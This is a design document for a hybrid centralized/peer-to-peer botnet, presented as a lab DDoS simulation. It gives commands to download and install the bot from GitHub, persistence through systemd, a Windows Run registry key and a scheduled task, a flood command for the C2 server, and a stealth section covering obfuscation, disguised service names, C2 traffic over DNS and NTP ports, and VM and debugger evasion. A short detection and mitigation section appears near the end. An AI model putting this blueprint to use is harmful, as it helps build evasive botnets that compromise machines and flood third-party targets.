
# Hybrid Star + Decentralized P2P Botnet Architecture  
**for Controlled Lab DDoS Simulation (v2.0 – Full Academic Design)**

**Author**: Educational Research Document  
**Purpose**: Strictly for cybersecurity lab simulation, academic study, and defensive research in an **isolated, air-gapped lab environment**.  
**Warning**: This architecture must only be used on dedicated lab VMs or machines with host-only networking. Never deploy on production systems or unauthorized networks.

---

## Executive Summary

This document presents a complete **hybrid botnet architecture** combining:
- **Star topology** (centralized Command & Control via Master device)
- **Decentralized P2P mesh** (gossip-based overlay for resilience)

The system provides **persistent control** over lab devices sufficient **only** for launching coordinated DDoS packet floods when explicitly commanded from the Master. It includes real-time visibility into connected/disconnected bots, device metadata, and flood statistics.

Key features:
- One-time payload delivery via GitHub
- OS-native persistence (no full root required)
- Hybrid communication (WebSocket star + UDP gossip P2P)
- DDoS flood engine (SYN, UDP, HTTP)
- Stealth and effectiveness enhancements for realistic simulation
- Full observability for research and defensive analysis

---

## 1. System Architecture Overview

### Hybrid Topology
- **Star Component**: All bots maintain a persistent connection to the Master for commands, heartbeats, and telemetry. The Master serves as the single source of truth.
- **Decentralized P2P Component**: Bots form a lightweight mesh using UDP gossip and local discovery. Commands can propagate peer-to-peer if the Master is temporarily unreachable.

This design balances **centralized control & visibility** with **decentralized resilience**, similar to evolved real-world botnets (Mirai P2P variants, Hajime, etc.).

### Core Components

| Component              | Role                                                                 | Technology Stack                              | Responsibilities |
|------------------------|----------------------------------------------------------------------|-----------------------------------------------|------------------|
| **Master (C2 Server)** | Central command authority and monitoring dashboard                   | Python 3.11+, asyncio, websockets, SQLite    | Command distribution, state tracking, statistics aggregation |
| **Bot Payload**        | Lightweight agent on each lab device                                 | Python script (or PyInstaller .exe)          | Persistence, C2 connection, P2P gossip, flood execution |
| **Communication**      | Hybrid Star + P2P                                                    | WebSocket (Star), UDP + zeroconf (P2P)       | Secure JSON messaging with HMAC |
| **Flood Engine**       | DDoS packet generation                                               | Scapy (Linux) / raw sockets                  | SYN/UDP/HTTP floods with rate limiting |

### Master Database Schema (SQLite)

```sql
CREATE TABLE bots (
    bot_id          TEXT PRIMARY KEY,
    local_ip        TEXT,
    os_info         TEXT,
    cpu_cores       INTEGER,
    last_seen       TIMESTAMP,
    status          TEXT CHECK(status IN ('online', 'flooding', 'offline')),
    connected_peers INTEGER DEFAULT 0,
    packets_sent    BIGINT DEFAULT 0,
    current_load    REAL DEFAULT 0.0
);
````

---

## 2. Payload Delivery & Initial Infection

### Step-by-Step Lab Procedure

1. **Preparation on Master Device**
    
    - Develop bot.py
    - Obfuscate (optional)
    - Commit to a **private** GitHub repo
    - Generate 32-byte shared HMAC key and embed in payload
2. **Deployment on Target Devices** (repeat for every lab VM/machine)
    
    Bash
    
    ```
    # Option 1: Git clone
    git clone https://github.com/yourusername/lab-botnet-payload.git
    
    # Option 2: Direct download
    curl -L -O https://raw.githubusercontent.com/yourusername/lab-botnet-payload/main/bot.py
    ```
    
    Bash
    
    ```
    python3 bot.py --install
    ```
    
3. **One-Time Initialization (inside bot.py)**
    
    - Generate unique Bot-ID: uuid.uuid4().hex + sha256(hostname + mac).hexdigest()[:16]
    - Copy payload to hidden persistent directory (~/.botnet/ or %APPDATA%\.botnet\)
    - Install persistence (Section 3)
    - Connect to Master WebSocket (ws://<MASTER_IP>:8765)
    - Send registration packet:
        
        JSON
        
        ```
        {
          "type": "register",
          "bot_id": "bot_8f3a9c2d...",
          "ip": "192.168.56.45",
          "os": "Ubuntu 24.04 LTS",
          "cores": 4,
          "timestamp": "2026-03-26T18:44:12Z"
        }
        ```
        
    - Master responds with ACK + initial peer list for P2P bootstrap.

---

## 3. Persistence Mechanism

**Linux (Recommended – Systemd User Service)**

ini

```
[Unit]
Description=Lab Botnet Research Agent

[Service]
ExecStart=/usr/bin/python3 /home/labuser/.botnet/bot.py
WorkingDirectory=/home/labuser/.botnet
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
```

Installation commands (executed once):

Bash

```
mkdir -p ~/.botnet ~/.config/systemd/user
cp bot.py ~/.botnet/
systemctl --user enable --now bot.service
```

**Windows**

- Registry method:
    
    PowerShell
    
    ```
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "LabBotAgent" -Value "%APPDATA%\.botnet\bot.exe"
    ```
    
- Or scheduled task:
    
    cmd
    
    ```
    schtasks /create /tn "LabBot" /tr "%APPDATA%\.botnet\bot.exe" /sc onlogon /ru CurrentUser
    ```
    

**Common Startup Logic**

- Check if running from persistent path → copy + self-relocate if needed
- Verify integrity (optional hash check)
- Attempt Master connection and P2P discovery
- Enter idle loop waiting for commands

---

## 4. Communication Protocols

### Star Channel (Master ↔ Bots)

- Persistent bidirectional WebSocket
- Heartbeat interval: 20 seconds (with jitter ±5s for stealth)
- Example heartbeat:
    
    JSON
    
    ```
    {
      "type": "heartbeat",
      "bot_id": "...",
      "load": 0.23,
      "connected_peers": 6,
      "flooding": true,
      "packets_sent": 2345678,
      "timestamp": "..."
    }
    ```
    

### P2P Gossip Mesh

- UDP port: 5678 (configurable, lab-only)
- Discovery: Python zeroconf library or raw UDP broadcast
- Neighbor limit: 8 peers
- Gossip packet structure:
    
    JSON
    
    ```
    {
      "type": "gossip",
      "cmd_id": "unique-uuid-here",
      "ttl": 4,
      "payload": { ... command data ... },
      "hmac": "..."
    }
    ```
    
- Loop prevention via cmd_id tracking (short-term memory)

**Security (Lab Context)**: HMAC-SHA256 signature on all commands using shared key.

---

## 5. Command & Control Flow – DDoS Attack

### Issuing a Flood Command

Bash

```
python master.py ddos --target 192.168.56.100 --port 80 --duration 180 --type syn --intensity high
```

### Detailed Flow

1. Master validates command and broadcasts to all connected bots via WebSocket.
2. Master also prepares gossip version for P2P redundancy.
3. Each bot:
    - Validates HMAC signature
    - Spawns asynchronous flood task
    - Sends ACK to Master
    - Gossips command to neighbors (with TTL)
4. Flood engine activates (see below)
5. Bots enrich heartbeats with flood metrics
6. Master updates live dashboard:
    - Connected: XX | Flooding: YY | Disconnected: ZZ
    - Estimated Aggregate PPS: 1.8M

### Flood Engine Implementation

- **SYN Flood**: Raw TCP packets with SYN flag, randomized source IP/port (Scapy or raw socket)
- **UDP Flood**: Randomized UDP payloads to target port
- **HTTP Flood**: Multi-threaded GET/POST requests (application layer)

Rate control: Automatically scales to available CPU cores while staying under 80% utilization.

---

## 6. Why This Design Succeeds in Lab Environment

- **Persistence**: Survives reboots using legitimate OS mechanisms
- **Low Footprint**: Only requires raw socket privileges (granted once)
- **Observability**: Master has precise count of "connected vs left" bots
- **Resilience**: P2P ensures commands reach bots even during Master outages
- **Controllability**: Flood starts/stops instantly on command
- **Educational Value**: Excellent for studying C2, P2P protocols, DDoS mechanics, and detection

---

## 7. Enhancing Stealth and Effectiveness

### Stealth Enhancements

- **Code Obfuscation**: pyarmor, PyInstaller with encryption, benign file/service names (system_health_monitor.py)
- **Traffic Evasion**:
    - WebSocket over port 443 (wss://)
    - P2P UDP on common ports (53/DNS, 123/NTP)
    - Random jitter on heartbeats and connections
- **Anti-Analysis**:
    - Detect VMs/debuggers and delay/sleep
    - Self-integrity checks
    - Memory-only decryption of sensitive strings
- **Persistence Hardening**:
    - Multiple fallback methods (systemd + cron on Linux)
    - Randomized task triggers on Windows

### Effectiveness Enhancements

- Dynamic flood intensity based on current CPU load
- Support for coordinated wave attacks with start-time jitter
- Bot subset control (e.g., sleep some bots, activate others)
- Application-layer floods (HTTP POST with random form data)
- Temporary P2P leader election if Master unreachable > 5 minutes
- Built-in packet logging hooks for post-attack Wireshark analysis

---

## 8. Defensive Research Perspective

**Detection Methods**:

- Anomalous raw socket usage or high outbound packet rates
- Periodic heartbeat patterns to fixed IP
- Unusual UDP broadcast/gossip traffic
- Persistence artifacts in systemd or Windows registry

**Mitigation Strategies**:

- Egress filtering on raw sockets
- Behavioral monitoring (process creation, network anomalies)
- Application whitelisting
- Network segmentation

**Tools for Analysis**:

- Wireshark / tcpdump
- Suricata / Snort
- OSSEC / Wazuh
- ELK Stack for log correlation

---

## 9. Lab Implementation Checklist

- Set up isolated lab network (host-only)
- Prepare and host bot.py on GitHub
- Deploy payload on test devices
- Verify registration and heartbeats on Master
- Test P2P gossip propagation
- Execute controlled DDoS simulation (target another lab VM)
- Capture and analyze traffic
- Document detection/mitigation observations
- Clean up lab environment after testing